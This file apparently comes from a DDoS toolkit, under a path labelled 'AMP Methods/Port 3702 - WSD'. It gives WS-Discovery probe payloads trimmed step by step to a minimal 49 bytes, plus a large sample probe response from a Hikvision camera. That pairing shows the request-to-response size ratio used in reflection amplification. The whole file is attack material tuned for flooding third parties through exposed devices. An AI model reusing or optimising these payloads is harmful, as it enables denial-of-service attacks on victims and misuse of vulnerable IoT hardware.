DDOS Scripts/AMP Methods/Port 3702 - WSD/WellFormed.xml

<!-- Well formed probe without alias bloat (140 bytes): -->
<s:Envelope><s:Header><a:MessageID>a</a:MessageID></s:Header><s:Body><d:Probe><d:Types>wsdp:Device</d:Types></d:Probe></s:Body></s:Envelope>

<!-- Not needed Types declaration as it defaults: <:Types>wsdp:Device</:Types> -->

<!-- Stripped down payload (102 bytes): -->
<:Envelope><:Header><:MessageID>a</:MessageID></:Header><:Body><:Probe></:Probe></:Body></:Envelope>

<!-- Refined well-formed payload by relying on defaults (49 bytes): -->
<Envelope><Body><Probe></Probe></Body></Envelope>

<!-- - -->

<!-- Typical Probe Response: -->
<?xml version="1.0" encoding="UTF-8"?>
\r\n<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:soapenc="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:tt="http://www.onvif.org/ver10/schema" xmlns:tds="http://www.onvif.org/ver10/device/wsdl" xmlns:trt="http://www.onvif.org/ver10/media/wsdl" xmlns:timg="http://www.onvif.org/ver20/imaging/wsdl" xmlns:tev="http://www.onvif.org/ver10/events/wsdl" xmlns:tptz="http://www.onvif.org/ver20/ptz/wsdl" xmlns:tan="http://www.onvif.org/ver20/analytics/wsdl" xmlns:tst="http://www.onvif.org/ver10/storage/wsdl" xmlns:ter="http://www.onvif.org/ver10/error" xmlns:dn="http://www.onvif.org/ver10/network/wsdl" xmlns:tns1="http://www.onvif.org/ver10/topics" xmlns:tmd="http://www.onvif.org/ver10/deviceIO/wsdl" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl" xmlns:wsoap12="http://schemas.xmlsoap.org/wsdl/soap12" xmlns:http="http://schemas.xmlsoap.org/wsdl/http" xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:wsadis="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsnt="http://docs.oasis-open.org/wsn/b-2" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wstop="http://docs.oasis-open.org/wsn/t-1" xmlns:wsrf-bf="http://docs.oasis-open.org/wsrf/bf-2" xmlns:wsntw="http://docs.oasis-open.org/wsn/bw-2" xmlns:wsrf-rw="http://docs.oasis-open.org/wsrf/rw-2" xmlns:wsaw="http://www.w3.org/2006/05/addressing/wsdl" xmlns:wsrf-r="http://docs.oasis-open.org/wsrf/r-2" xmlns:trc="http://www.onvif.org/ver10/recording/wsdl" xmlns:tse="http://www.onvif.org/ver10/search/wsdl" xmlns:trp="http://www.onvif.org/ver10/replay/wsdl" xmlns:tnshik="http://www.hikvision.com/2011/event/topics" xmlns:hikwsd="http://www.onvifext.com/onvif/ext/ver10/wsdl" xmlns:hikxsd="http://www.onvifext.com/onvif/ext/ver10/schema" xmlns:tas="http://www.onvif.org/ver10/advancedsecurity/wsdl">
	<env:Header>
		<wsadis:MessageID>urn:uuid:ec4914fd-936b-11b5-8467-2857be33e0b0</wsadis:MessageID>
		\r\n
		<wsadis:RelatesTo>urn:uuid:ce04dad0-5d2c-4026-9146-1aabfc1e4111</wsadis:RelatesTo>
		\r\n
		<wsadis:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsadis:To>
		\r\n
		<wsadis:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/ProbeMatches</wsadis:Action>
		\r\n
		<d:AppSequence InstanceId="1592239476" MessageNumber="28429" />
		\r\n
	</env:Header>
	\r\n
	<env:Body>
		<d:ProbeMatches>
			<d:ProbeMatch>
				<wsadis:EndpointReference>
					<wsadis:Address>urn:uuid:ec4914fd-936b-11b5-8467-2857be33e0b0</wsadis:Address>
					\r\n
				</wsadis:EndpointReference>
				\r\n
				<d:Types>dn:NetworkVideoTransmitter tds:Device</d:Types>
				\r\n
				<d:Scopes>onvif://www.onvif.org/type/video_encoder onvif://www.onvif.org/Profile/Streaming onvif://www.onvif.org/Profile/G onvif://www.onvif.org/hardware/DS-2CD2T32-I3 onvif://www.onvif.org/name/HIKVISION%20DS-2CD2T32-I3 onvif://www.onvif.org/location/city/hangzhou</d:Scopes>
				\r\n
				<d:XAddrs>http://192.168.100.31/onvif/device_service http://[fe80::2a57:beff:fe33:e0b0]/onvif/device_service</d:XAddrs>
				\r\n
				<d:MetadataVersion>10</d:MetadataVersion>
				\r\n
			</d:ProbeMatch>
			\r\n
		</d:ProbeMatches>
		\r\n
	</env:Body>
	\r\n
</env:Envelope>\r\n